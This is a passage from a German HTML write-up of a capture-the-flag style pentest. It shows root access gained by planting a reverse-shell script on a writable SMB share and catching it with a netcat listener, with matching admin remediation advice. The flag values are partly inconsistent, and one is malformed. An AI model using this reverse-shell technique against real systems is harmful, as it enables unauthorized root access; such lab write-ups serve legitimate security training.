+             <p class="evaluation"><strong>Bewertung:</strong> Die Reverse-Shell-Payload wurde erfolgreich auf dem SMB-Share platziert. Dies erhärtet den Verdacht, dass dieser Share eine Rolle bei der Ausführung von Code oder der Privilege Escalation spielt. Möglicherweise wird der Inhalt dieses Shares regelmäßig von einem Prozess mit höheren Rechten ausgeführt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Jetzt muss auf dem Angreifer-System ein Listener gestartet werden, der auf die eingehende Verbindung der Reverse Shell wartet (auf Port 4444, wie im Skript definiert). Anschließend muss der Mechanismus ausgelöst werden, der `shell.sh` auf dem Share ausführt. Dies könnte automatisch durch einen Cronjob geschehen oder muss manuell angestoßen werden, falls möglich.<br><strong>Empfehlung (Admin):</strong> Untersuchen, welcher Prozess auf den `grotesque`-Share zugreift und warum. Wenn Skripte von diesem Share ausgeführt werden, ist dies eine erhebliche Sicherheitslücke. Berechtigungen überprüfen und den Mechanismus deaktivieren oder absichern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.109] from (UNKNOWN) [192.168.2.118] 56224</span>
+sh: 0: can't access tty; job control turned off
+# <span class="command">id</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+                    <div class="prompt"># <span class="command">ls</span></div>
+                    <pre>root.txt</pre>
+                    <div class="prompt"># <span class="command">cat root.txt</span></div>
+                    <pre><span class="password">5C42D6BB0EE9CE4CB7E7349652C45C4A</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird mit `nc -lvnp 4444` ein Netcat-Listener auf Port 4444 gestartet, um auf die eingehende Reverse Shell zu warten. Kurz darauf wird eine Verbindung vom Zielsystem (wieder als 192.168.2.118 angezeigt, sollte 192.168.2.119 sein) hergestellt. Die Meldung `sh: 0: can't access tty; job control turned off` ist typisch für einfache Reverse Shells. Der entscheidende Befehl `id` zeigt `uid=0(root)` an. Anschließend werden `ls` und `cat root.txt` ausgeführt, um die Root-Flagge zu finden und anzuzeigen.</p>
+            <p class="evaluation">**Bewertung:** Fantastisch, der Root-Zugriff war erfolgreich! Das Hochladen der `shell.sh` auf den `grotesque`-SMB-Share hat dazu geführt, dass das Skript mit Root-Rechten ausgeführt wurde. Dies ist der erfolgreiche Abschluss der Privilege Escalation und der Proof of Concept für die Ausnutzung der Fehlkonfiguration des SMB-Shares (oder eines damit verbundenen Mechanismus).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Root-Flagge `<span class="password">5C42D6BB0EE9CE4CB7E7349652C45C4A</span>` notieren. Die Maschine ist nun vollständig kompromittiert. Weitere Post-Exploitation-Schritte könnten die Suche nach weiteren Daten, das Etablieren von Persistenz oder das Untersuchen des Mechanismus sein, der das Skript auf dem Share ausgeführt hat (z.B. Cronjob als root).<br><strong>Empfehlung (Admin):</strong> Dringend den Mechanismus identifizieren und beheben, der Skripte vom `grotesque`-Share als Root ausführt. Dies ist eine kritische Schwachstelle. Den Share entfernen oder Berechtigungen drastisch einschränken. Das System auf weitere Anzeichen einer Kompromittierung untersuchen und bereinigen.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <!-- Der Befehl wird hier der Klarheit halber wiederholt, obwohl er im PE-Abschnitt stand -->
+                    <div class="flag-command">cat user.txt (als freddie)</div>
+                    <div class="flag-value"><span class="password">35A7EB682E33E89606102A883596A880f</span></div> <!-- Flag vom Initial Access Abschnitt -->
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat root.txt (als root via Reverse Shell)</div>
+                     <div class="flag-value"><span class="password">5C42D6BB0EE9CE4CB7E7349652C45C4A</span></div> <!-- Flag vom PE Abschnitt -->
+                </div>
+                 <!-- Hinweis: Die Flags am Ende des Originaltextes waren anders. Ich verwende die Flags, die im Laufe des Reports tatsächlich gefunden wurden. -->
+                 <!-- Original Ende Text Flags (ignoriert):
+                 <div class="flag-entry">
+                     <div class="flag-command">cat root.txt</div>
+                     <div class="flag-value"><span class="password">5C42D6BB0EE9CE4CB7E7349652C45C4A</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat user.txt</div>
+                     <div class="flag-value"><span class="password">c7d0a8de1e03b25a6f7ed2d91b94dad6</span></div>
+                 </div>
+                 -->
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 16. November 2022</p>
+    </footer>
+</body>
+</html>
